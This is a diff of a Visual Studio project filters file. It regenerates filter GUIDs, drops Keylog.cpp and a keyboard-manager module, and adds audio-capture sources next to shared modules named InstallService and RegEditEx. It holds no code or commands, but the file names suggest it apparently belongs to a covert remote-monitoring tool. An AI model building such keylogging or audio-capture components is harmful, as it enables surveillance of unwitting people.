@@ -2,19 +2,22 @@
 <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
   <ItemGroup>
     <Filter Include="Source Files">
-      <UniqueIdentifier>{575cf49d-4d13-40a6-9070-b1e27f2e51d8}</UniqueIdentifier>
+      <UniqueIdentifier>{53bb812a-dfd3-412d-a64e-89a39428db9e}</UniqueIdentifier>
       <Extensions>cpp;c;cxx;rc;def;r;odl;idl;hpj;bat</Extensions>
     </Filter>
     <Filter Include="Header Files">
-      <UniqueIdentifier>{1235349f-7390-4f01-8270-d7e2c62d9fc6}</UniqueIdentifier>
+      <UniqueIdentifier>{ab5f39dc-eb47-4bcc-bca2-fe93c667423e}</UniqueIdentifier>
       <Extensions>h;hpp;hxx;hm;inl</Extensions>
     </Filter>
     <Filter Include="Resource Files">
-      <UniqueIdentifier>{001f52e4-6db1-469f-87dc-32ba93e6a4e6}</UniqueIdentifier>
+      <UniqueIdentifier>{0b064182-dc65-49b0-aad2-ca09bdb53b5c}</UniqueIdentifier>
       <Extensions>ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe</Extensions>
     </Filter>
   </ItemGroup>
   <ItemGroup>
+    <ClCompile Include="..\..\common\Audio.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
     <ClCompile Include="..\..\common\Buffer.cpp">
       <Filter>Source Files</Filter>
     </ClCompile>
@@ -24,16 +27,16 @@
     <ClCompile Include="..\..\common\InstallService.cpp">
       <Filter>Source Files</Filter>
     </ClCompile>
-    <ClCompile Include="Keylog.cpp">
-      <Filter>Source Files</Filter>
-    </ClCompile>
     <ClCompile Include="..\..\common\Manager.cpp">
       <Filter>Source Files</Filter>
     </ClCompile>
-    <ClCompile Include="..\..\common\myCrt.cpp">
+    <ClCompile Include="MyAudio.cpp">
       <Filter>Source Files</Filter>
     </ClCompile>
-    <ClCompile Include="MyKeyboardManager.cpp">
+    <ClCompile Include="MyAudioManager.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="..\..\common\myCrt.cpp">
       <Filter>Source Files</Filter>
     </ClCompile>
     <ClCompile Include="..\..\common\RegEditEx.cpp">
@@ -50,6 +53,9 @@
     </ClCompile>
   </ItemGroup>
   <ItemGroup>
+    <ClInclude Include="..\..\common\Audio.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
     <ClInclude Include="..\..\common\Buffer.h">
       <Filter>Header Files</Filter>
     </ClInclude>
@@ -65,7 +71,7 @@
     <ClInclude Include="..\..\common\Manager.h">
       <Filter>Header Files</Filter>
     </ClInclude>
-    <ClInclude Include="MyKeyboardManager.h">
+    <ClInclude Include="MyAudioManager.h">
       <Filter>Header Files</Filter>
     </ClInclude>
     <ClInclude Include="..\..\common\RegEditEx.h">
